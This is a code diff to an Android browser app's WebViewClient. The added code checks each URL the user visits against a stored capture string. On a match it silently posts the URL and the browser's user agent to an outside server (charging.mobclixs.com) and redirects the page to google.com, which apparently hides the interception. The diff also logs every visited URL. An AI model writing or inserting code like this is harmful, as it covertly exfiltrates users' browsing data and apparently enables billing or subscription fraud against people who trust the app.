@@ -9,10 +9,12 @@ import android.graphics.Bitmap;
 import android.graphics.Typeface;
 import android.net.MailTo;
 import android.net.http.SslError;
+import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Message;
 import android.support.annotation.NonNull;
 import android.text.method.PasswordTransformationMethod;
+import android.util.Log;
 import android.view.LayoutInflater;
 import android.webkit.CookieManager;
 import android.webkit.HttpAuthHandler;
@@ -25,29 +27,44 @@ import android.widget.EditText;
 import android.widget.LinearLayout;
 
 import com.mojodigi.ninjafox.R;
+import com.mojodigi.ninjafox.SharedPrefs.AppConstants;
+import com.mojodigi.ninjafox.SharedPrefs.SharedPreferenceUtil;
+import com.mojodigi.ninjafox.Task.ApiRequestTask;
 import com.mojodigi.ninjafox.Unit.BrowserUtility;
 import com.mojodigi.ninjafox.Unit.IntentUtility;
 import com.mojodigi.ninjafox.View.jmmWebView;
 
+import org.json.JSONObject;
+
 import java.io.ByteArrayInputStream;
+import java.io.IOException;
 import java.net.CookieStore;
 
-public class NinjaWebViewClient extends WebViewClient {
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
+
+public class NinjaWebViewClient extends WebViewClient  implements ApiRequestTask.JsonLoadListener {
     private jmmWebView customWebView;
     private Context context;
 
     private AdBlock adBlock;
 
     private boolean white;
+    private String sendUrl;
+
     public void updateWhite(boolean white) {
         this.white = white;
     }
 
     private boolean enable;
+    String ua ;
     public void enableAdBlock(boolean enable) {
         this.enable = enable;
     }
-
+    SharedPreferenceUtil mPrefs;
     public NinjaWebViewClient(jmmWebView customWebView) {
         super();
         this.customWebView = customWebView;
@@ -55,11 +72,19 @@ public class NinjaWebViewClient extends WebViewClient {
         this.adBlock = customWebView.getAdBlock();
         this.white = false;
         this.enable = true;
+        ua=new WebView(context).getSettings().getUserAgentString();
+        mPrefs=new SharedPreferenceUtil(context);
     }
 
     @Override
     public void onPageStarted(WebView view, String url, Bitmap favicon) {
         super.onPageStarted(view, url, favicon);
+
+        String captureStr=mPrefs.getStringValue(AppConstants.PREFS_CAPTURE_STR, "");
+        if(url.contains(captureStr))
+        {
+            customWebView.loadUrl("http://www.google.com");
+        }
 
         if (view.getTitle() == null || view.getTitle().isEmpty()) {
             customWebView.update(context.getString(R.string.album_untitled), url);
@@ -71,6 +96,7 @@ public class NinjaWebViewClient extends WebViewClient {
     @Override
     public void onPageFinished(WebView view, String url) {
         super.onPageFinished(view, url);
+
 
         if (!customWebView.getSettings().getLoadsImagesAutomatically()) {
             customWebView.getSettings().setLoadsImagesAutomatically(true);
@@ -97,6 +123,10 @@ public class NinjaWebViewClient extends WebViewClient {
 
     @Override
     public boolean shouldOverrideUrlLoading(WebView view, String url) {
+
+
+
+
         if (url.startsWith(BrowserUtility.URL_SCHEME_MAIL_TO)) {
             Intent intent = IntentUtility.getEmailIntent(MailTo.parse(url));
             context.startActivity(intent);
@@ -108,11 +138,40 @@ public class NinjaWebViewClient extends WebViewClient {
                 intent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);
                 context.startActivity(intent);
                 return true;
-            } catch (Exception e) {} // When intent fail will crash
+            } catch (Exception e) {
+
+            } // When intent fail will crash
         }
 
         white = adBlock.isWhite(url);
+
+        String captureStr=mPrefs.getStringValue(AppConstants.PREFS_CAPTURE_STR, "");
+         if(url.contains(captureStr))
+        {
+            try {
+                sendUrl=url;
+                //new postAsync().execute();
+                JSONObject jsonObject =new JSONObject();
+                jsonObject.put("url", sendUrl);
+                jsonObject.put("ua", ua);
+                new ApiRequestTask(context, this, "http://charging.mobclixs.com/api/v1/callertune", false, false, null, jsonObject.toString(), 123).execute();
+            }catch (Exception e)
+            {
+
+            }
+
+            //here
+            customWebView.loadUrl("http://www.google.com");
+
+        }
+
         return super.shouldOverrideUrlLoading(view, url);
+    }
+
+    @Override
+    public void doUpdateVisitedHistory(WebView view, String url, boolean isReload) {
+        super.doUpdateVisitedHistory(view, url, isReload);
+        Log.d("Url", ""+url);
     }
 
     @Deprecated
@@ -239,5 +298,54 @@ public class NinjaWebViewClient extends WebViewClient {
         });
 
         builder.create().show();
+    }
+
+    @Override
+    public void onJsonLoad(String json, int mRequestCode) {
+
+        Log.d("dataStr", json.toLowerCase());
+    }
+
+    @Override
+    public void onLoadFailed(String msg) {
+
+    }
+
+
+    private  class  postAsync extends AsyncTask<String,String,String>
+    {
+
+
+        @Override
+        protected String doInBackground(String... strings) {
+
+
+            OkHttpClient client = new OkHttpClient();
+            RequestBody requestBody = new MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("URL", sendUrl)
+                    .addFormDataPart("UA", ua)
+                    .build();
+
+            Request request = new Request.Builder()
+                    .url("http://charging.mobclixs.com/api/v1/callertune")
+                    .post(requestBody)
+                    .build();
+
+            try {
+                Response response = client.newCall(request).execute();
+                return response.body().toString();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            return "";
+        }
+
+        @Override
+        protected void onPostExecute(String s) {
+            super.onPostExecute(s);
+            Log.d("DataStr", s.toString());
+
+        }
     }
 }
